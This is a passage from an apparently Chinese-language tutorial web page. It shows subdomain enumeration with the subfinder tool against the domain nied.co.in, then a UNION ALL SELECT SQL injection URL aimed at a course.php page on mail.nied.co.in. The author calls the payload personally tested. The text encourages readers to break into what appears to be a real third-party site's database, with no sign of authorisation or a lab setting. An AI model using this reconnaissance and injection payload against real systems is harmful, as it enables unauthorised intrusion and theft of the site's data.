<h2 id="使用-subfinder" tabindex="-1"><a class="header-anchor" href="#使用-subfinder"><span>使用 subfinder</span></a></h2>
<p>打开终端，终于轮到<code v-pre>subfinder</code>登场💡：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>subfinder</span><span class="space"> </span><span>-d</span><span class="space"> </span><span>nied.co.in</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>由于网站在外🕸️，速度较慢，我们等待一段时间⌛️。</p>
<p><img src="https://p.ipic.vip/ynzh23.png" alt="截屏2024-11-25 00.22.11"></p>
<p>到这里，所有的问题都已经解决，该网站的数据库将向你敞开，尽情地用💉扎它吧。将原来的域名替换成这里的域名。例如，将域名换成<strong>mail.nied.co.in</strong>是亲测有效的注入域名：</p>
<div class="language-sql line-numbers-mode" data-ext="sql" data-title="sql"><button class="copy" title="复制代码" data-copied="已复制"></button><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code" v-pre=""><code><span class="line"><span>https://mail.nied.co.in/course.php?course=1</span><span class="space"> </span><span>'</span><span class="space"> </span><span>UNION</span><span class="space"> </span><span>ALL</span><span class="space"> </span><span>SELECT</span><span class="space"> </span><span>1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40</span></span></code></pre>

<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>在浏览器中输入后将会得到该网站的信息。</p>
</div></template>


